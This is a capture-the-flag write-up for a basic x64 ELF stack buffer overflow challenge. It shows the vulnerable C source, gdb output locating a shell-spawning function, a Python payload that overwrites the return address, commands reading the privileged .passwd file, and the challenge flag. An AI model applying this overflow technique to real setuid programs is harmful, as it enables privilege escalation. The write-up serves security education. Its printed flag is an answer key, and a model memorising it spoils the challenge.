<h1>ELF x64 - Stack buffer overflow - basic</h1>
<h3>Description</h3>

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
 
/*
gcc -o ch35 ch35.c -fno-stack-protector -no-pie -Wl,-z,relro,-z,now,-z,noexecstack
*/
 
void callMeMaybe(){
    char *argv[] = { "/bin/bash", "-p", NULL };
    execve(argv[0], argv, NULL);
}
 
int main(int argc, char **argv){
 
    char buffer[256];
    int len, i;
 
    scanf("%s", buffer);
    len = strlen(buffer);
 
    printf("Hello %s\n", buffer);
 
    return 0;
}
```
<h3>Solution</h3>
<label>Check address fungsi callMeMaybe() = 0x00000000004005e7 </label>

```console
app-systeme-ch35@challenge03:~$ gdb -q ./ch35
Reading symbols from ./ch35...(no debugging symbols found)...done.
(gdb) info func
All defined functions:

Non-debugging symbols:
0x0000000000400498  _init
0x00000000004004c0  strlen@plt
0x00000000004004d0  printf@plt
0x00000000004004e0  execve@plt
0x00000000004004f0  __isoc99_scanf@plt
0x0000000000400500  _start
0x0000000000400530  _dl_relocate_static_pie
0x0000000000400540  deregister_tm_clones
0x0000000000400570  register_tm_clones
0x00000000004005b0  __do_global_dtors_aux
0x00000000004005e0  frame_dummy
0x00000000004005e7  callMeMaybe
0x0000000000400628  main
0x0000000000400690  __libc_csu_init
0x0000000000400700  __libc_csu_fini
0x0000000000400704  _fini
(gdb) exit
Undefined command: "exit".  Try "help".
(gdb) quit
app-systeme-ch35@challenge03:~$ (python -c "print('A'*280+'\xe7\x05\x40\x00')")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@
app-systeme-ch35@challenge03:~$ (python -c "print('A'*280+'\xe7\x05\x40\x00\x00\x00\x00\x00')"; echo ls -al) | ./ch35 
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
otal 36
drwxr-x---  2 app-systeme-ch35-cracked app-systeme-ch35         4096 Dec 10  2021 .
drwxr-xr-x 65 root                     root                     4096 Jul  4  2024 ..
-r--------  1 root                     root                      661 Dec 10  2021 ._perms
-rw-r-----  1 root                     root                       44 Dec 10  2021 .git
-r--------  1 app-systeme-ch35-cracked app-systeme-ch35-cracked   32 Dec 10  2021 .passwd
-rwsr-x---  1 app-systeme-ch35-cracked app-systeme-ch35         8272 Dec 10  2021 ch35
-rw-r-----  1 app-systeme-ch35-cracked app-systeme-ch35          474 Dec 10  2021 ch35.c
app-systeme-ch35@challenge03:~$ (python -c "print('A'*280+'\xe7\x05\x40\x00\x00\x00\x00\x00')"; echo cat .passwd) | ./ch35 
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
4sicBufferOverflowExploitation

```
<h3>Flag</h3>
<pre>
B4sicBufferOverflowExploitation
</pre>
